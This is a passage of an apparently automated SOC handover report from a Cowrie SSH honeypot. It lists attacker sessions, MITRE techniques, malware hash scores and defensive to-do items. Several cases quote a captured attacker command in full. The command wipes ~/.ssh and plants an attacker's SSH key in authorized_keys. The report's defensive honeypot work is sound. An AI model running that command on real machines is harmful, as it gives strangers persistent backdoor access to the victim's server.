| `2026-04-13 19:03:29` | `cowrie.session.params` |
| `2026-04-13 19:03:29` | `cowrie.command.input` |
| `2026-04-13 19:03:29` | `cowrie.session.file_download` |
| `2026-04-13 19:03:29` | `cowrie.log.closed` |
| `2026-04-13 19:03:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.186.1[.]59` to AbuseIPDB if not already reported
- [ ] Block `103.186.1[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-db63469a3cca

| Field | Detail |
|---|---|
| **Source IP** | `103.186.1[.]59` |
| **First Seen** | 2026-04-13 19:03 |
| **Last Seen** | 2026-04-13 19:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 19:03:32` | `cowrie.session.connect` |
| `2026-04-13 19:03:32` | `cowrie.client.version` |
| `2026-04-13 19:03:32` | `cowrie.client.kex` |
| `2026-04-13 19:03:33` | `cowrie.login.success` |
| `2026-04-13 19:03:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.186.1[.]59` to AbuseIPDB if not already reported
- [ ] Block `103.186.1[.]59` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5fe0b98c7a20

| Field | Detail |
|---|---|
| **Source IP** | `201.249.205[.]94` |
| **First Seen** | 2026-04-13 19:04 |
| **Last Seen** | 2026-04-13 19:04 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 19:04:41` | `cowrie.session.connect` |
| `2026-04-13 19:04:41` | `cowrie.client.version` |
| `2026-04-13 19:04:42` | `cowrie.client.kex` |
| `2026-04-13 19:04:43` | `cowrie.login.success` |
| `2026-04-13 19:04:43` | `cowrie.session.params` |
| `2026-04-13 19:04:43` | `cowrie.command.input` |
| `2026-04-13 19:04:43` | `cowrie.command.failed` |
| `2026-04-13 19:04:44` | `cowrie.log.closed` |
| `2026-04-13 19:04:44` | `cowrie.session.params` |
| `2026-04-13 19:04:44` | `cowrie.command.input` |
| `2026-04-13 19:04:45` | `cowrie.session.file_download` |
| `2026-04-13 19:04:45` | `cowrie.log.closed` |
| `2026-04-13 19:04:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.249.205[.]94` to AbuseIPDB if not already reported
- [ ] Block `201.249.205[.]94` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fcceb0820996

| Field | Detail |
|---|---|
| **Source IP** | `201.249.205[.]94` |
| **First Seen** | 2026-04-13 19:04 |
| **Last Seen** | 2026-04-13 19:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 19:04:48` | `cowrie.session.connect` |
| `2026-04-13 19:04:48` | `cowrie.client.version` |
| `2026-04-13 19:04:48` | `cowrie.client.kex` |
| `2026-04-13 19:04:50` | `cowrie.login.success` |
| `2026-04-13 19:04:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.249.205[.]94` to AbuseIPDB if not already reported
- [ ] Block `201.249.205[.]94` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4f130238c475

| Field | Detail |
|---|---|
| **Source IP** | `103.210.123[.]113` |
| **First Seen** | 2026-04-13 19:05 |
| **Last Seen** | 2026-04-13 19:06 |
| **Session Duration** | 101s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `enable, system, shell, sh, cat /proc/mounts; /bin/busybox AFAKD` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 19:05:05` | `cowrie.session.connect` |
| `2026-04-13 19:05:05` | `cowrie.telnet.option` |
| `2026-04-13 19:05:05` | `cowrie.login.success` |
| `2026-04-13 19:05:05` | `cowrie.session.params` |
| `2026-04-13 19:05:05` | `cowrie.command.input` |
| `2026-04-13 19:05:05` | `cowrie.command.input` |
| `2026-04-13 19:05:05` | `cowrie.command.failed` |
| `2026-04-13 19:05:05` | `cowrie.command.input` |
| `2026-04-13 19:05:05` | `cowrie.command.failed` |
| `2026-04-13 19:05:05` | `cowrie.command.input` |
| `2026-04-13 19:05:06` | `cowrie.command.input` |
| `2026-04-13 19:05:06` | `cowrie.command.input` |
| `2026-04-13 19:05:06` | `cowrie.command.input` |
| `2026-04-13 19:05:06` | `cowrie.command.input` |
| `2026-04-13 19:05:06` | `cowrie.command.failed` |
| `2026-04-13 19:05:06` | `cowrie.command.input` |
| `2026-04-13 19:05:06` | `cowrie.command.input` |
| `2026-04-13 19:05:06` | `cowrie.command.input` |
| `2026-04-13 19:05:06` | `cowrie.command.input` |
| `2026-04-13 19:05:06` | `cowrie.command.input` |
| `2026-04-13 19:05:06` | `cowrie.command.input` |
| `2026-04-13 19:05:06` | `cowrie.command.input` |
| `2026-04-13 19:05:07` | `cowrie.command.input` |
| `2026-04-13 19:05:07` | `cowrie.command.input` |
| `2026-04-13 19:05:07` | `cowrie.command.input` |
| `2026-04-13 19:05:07` | `cowrie.command.input` |
| `2026-04-13 19:05:07` | `cowrie.command.input` |
| `2026-04-13 19:05:07` | `cowrie.command.failed` |
| `2026-04-13 19:06:47` | `cowrie.log.closed` |
| `2026-04-13 19:06:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.210.123[.]113` to AbuseIPDB if not already reported
- [ ] Block `103.210.123[.]113` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4f493b5f2eb3

| Field | Detail |
|---|---|
| **Source IP** | `120.48.55[.]25` |
| **First Seen** | 2026-04-13 19:05 |
| **Last Seen** | 2026-04-13 19:06 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 19:05:51` | `cowrie.session.connect` |
| `2026-04-13 19:05:51` | `cowrie.client.version` |
| `2026-04-13 19:05:52` | `cowrie.client.kex` |
| `2026-04-13 19:05:54` | `cowrie.login.success` |
| `2026-04-13 19:05:55` | `cowrie.session.params` |
| `2026-04-13 19:05:55` | `cowrie.command.input` |
| `2026-04-13 19:05:55` | `cowrie.command.failed` |
| `2026-04-13 19:05:56` | `cowrie.log.closed` |
| `2026-04-13 19:05:56` | `cowrie.session.params` |
| `2026-04-13 19:05:56` | `cowrie.command.input` |
| `2026-04-13 19:05:56` | `cowrie.session.file_download` |
| `2026-04-13 19:05:56` | `cowrie.log.closed` |
| `2026-04-13 19:06:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.55[.]25` to AbuseIPDB if not already reported
- [ ] Block `120.48.55[.]25` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2a3ab3ed9866

| Field | Detail |
|---|---|
| **Source IP** | `120.48.55[.]25` |
| **First Seen** | 2026-04-13 19:06 |
| **Last Seen** | 2026-04-13 19:06 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 19:06:01` | `cowrie.session.connect` |
| `2026-04-13 19:06:01` | `cowrie.client.version` |
| `2026-04-13 19:06:01` | `cowrie.client.kex` |
| `2026-04-13 19:06:06` | `cowrie.login.success` |
| `2026-04-13 19:06:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.55[.]25` to AbuseIPDB if not already reported
- [ ] Block `120.48.55[.]25` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-74e53ea42805

| Field | Detail |
|---|---|
| **Source IP** | `183.110.63[.]196` |
| **First Seen** | 2026-04-13 19:06 |
| **Last Seen** | 2026-04-13 19:06 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 19:06:32` | `cowrie.session.connect` |
| `2026-04-13 19:06:32` | `cowrie.client.version` |
| `2026-04-13 19:06:32` | `cowrie.client.kex` |
| `2026-04-13 19:06:33` | `cowrie.login.success` |
| `2026-04-13 19:06:33` | `cowrie.session.params` |
| `2026-04-13 19:06:33` | `cowrie.command.input` |
| `2026-04-13 19:06:33` | `cowrie.command.failed` |
| `2026-04-13 19:06:33` | `cowrie.log.closed` |
| `2026-04-13 19:06:33` | `cowrie.session.params` |
| `2026-04-13 19:06:33` | `cowrie.command.input` |
| `2026-04-13 19:06:33` | `cowrie.session.file_download` |
| `2026-04-13 19:06:33` | `cowrie.log.closed` |
| `2026-04-13 19:06:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.110.63[.]196` to AbuseIPDB if not already reported
- [ ] Block `183.110.63[.]196` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-41aa39ba4441

| Field | Detail |
|---|---|
| **Source IP** | `183.110.63[.]196` |
| **First Seen** | 2026-04-13 19:06 |
| **Last Seen** | 2026-04-13 19:06 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 19:06:36` | `cowrie.session.connect` |
| `2026-04-13 19:06:36` | `cowrie.client.version` |
| `2026-04-13 19:06:36` | `cowrie.client.kex` |
| `2026-04-13 19:06:36` | `cowrie.login.success` |
| `2026-04-13 19:06:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.110.63[.]196` to AbuseIPDB if not already reported
- [ ] Block `183.110.63[.]196` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b09cf08d7ce0

| Field | Detail |
|---|---|
| **Source IP** | `103.139.193[.]223` |
| **First Seen** | 2026-04-13 19:09 |
| **Last Seen** | 2026-04-13 19:09 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 19:09:16` | `cowrie.session.connect` |
| `2026-04-13 19:09:16` | `cowrie.client.version` |
| `2026-04-13 19:09:16` | `cowrie.client.kex` |
| `2026-04-13 19:09:17` | `cowrie.login.success` |
| `2026-04-13 19:09:18` | `cowrie.session.params` |
| `2026-04-13 19:09:18` | `cowrie.command.input` |
| `2026-04-13 19:09:18` | `cowrie.command.failed` |
| `2026-04-13 19:09:18` | `cowrie.log.closed` |
| `2026-04-13 19:09:18` | `cowrie.session.params` |
| `2026-04-13 19:09:18` | `cowrie.command.input` |
| `2026-04-13 19:09:19` | `cowrie.session.file_download` |
| `2026-04-13 19:09:19` | `cowrie.log.closed` |
| `2026-04-13 19:09:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.139.193[.]223` to AbuseIPDB if not already reported
- [ ] Block `103.139.193[.]223` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9324edb1f9ed

| Field | Detail |
|---|---|
| **Source IP** | `103.139.193[.]223` |
| **First Seen** | 2026-04-13 19:09 |
| **Last Seen** | 2026-04-13 19:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 19:09:21` | `cowrie.session.connect` |
| `2026-04-13 19:09:21` | `cowrie.client.version` |
| `2026-04-13 19:09:21` | `cowrie.client.kex` |
| `2026-04-13 19:09:22` | `cowrie.login.success` |
| `2026-04-13 19:09:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.139.193[.]223` to AbuseIPDB if not already reported
- [ ] Block `103.139.193[.]223` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `175.107.233[.]41` | **22** | 2026-04-13 18:57 | 2026-04-13 19:02 | 4m | 0 | `T1592` | 🟠 MEDIUM |
| `190.181.27[.]27` | **16** | 2026-04-13 17:01 | 2026-04-13 17:29 | 0m | 16 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `103.139.193[.]223` | **3** | 2026-04-13 19:05 | 2026-04-13 19:11 | 0m | 3 | `T1110.001 · T1592` | 🟢 LOW |
| `9.223.176[.]221` | **3** | 2026-04-13 19:04 | 2026-04-13 19:09 | 0m | 3 | `T1110.001 · T1592` | 🟢 LOW |
| `103.186.1[.]59` | 1 | 2026-04-13 19:03 | 2026-04-13 19:03 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `120.48.55[.]25` | 1 | 2026-04-13 19:05 | 2026-04-13 19:06 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `183.110.63[.]196` | 1 | 2026-04-13 19:06 | 2026-04-13 19:06 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `201.249.205[.]94` | 1 | 2026-04-13 19:04 | 2026-04-13 19:04 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `91.230.168[.]40` | 1 | 2026-04-13 18:03 | 2026-04-13 18:03 | 3s | 0 | `T1592` | 🟢 LOW |
| `91.230.168[.]58` | 1 | 2026-04-13 18:03 | 2026-04-13 18:03 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (22 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 42/100 | 🟡 MEDIUM | **32/76** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 43/100 | 🟡 MEDIUM | **35/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 41/100 | 🟡 MEDIUM | **29/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/76** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 46/100 | 🟡 MEDIUM | **43/76** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **30/76** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 41/100 | 🟡 MEDIUM | **28/76** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 46/100 | 🟡 MEDIUM | **43/76** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 46/100 | 🟡 MEDIUM | **43/76** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 46/100 | 🟡 MEDIUM | **43/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 46/100 | 🟡 MEDIUM | **43/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `175.107.233[.]41` | PK | Broadband Services | **100** ⚠️ | 0 |
| `91.230.168[.]58` | US | FR ONYPHE | **100** ⚠️ | 22 |
| `91.230.168[.]40` | US | FR ONYPHE | **100** ⚠️ | 24 |
| `120.48.55[.]25` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 20 |
| `183.110.63[.]196` | KR | Korea Telecom | **100** ⚠️ | 22 |
| `201.249.205[.]94` | VE | CANTV Servicios, Venezuela | **100** ⚠️ | 50 |
| `190.181.27[.]27` | BO | AXS Bolivia S. A. | **100** ⚠️ | 50 |
| `9.223.176[.]221` | SE | Microsoft Limited | **100** ⚠️ | 50 |
| `103.139.193[.]223` | ID | PT. Halto Petirah Angrowangi | **100** ⚠️ | 38 |
| `103.186.1[.]59` | ID | CV Ansa Project | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 48 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 26 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 23 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 12 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 11 |

---

## 🔕 False Positive Summary (2 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| AbuseIPDB score 21 below threshold 25 | 1 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 75 cases |
| Tool 34  | Credential Extractor        | ✅ 49 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 1 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 13 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 2 filtered (2.7%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 10 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 22 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 23 priority case(s) shown individually · 10 recon entry/entries in table (4 group(s) consolidating 44 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-13T19:13:02Z_
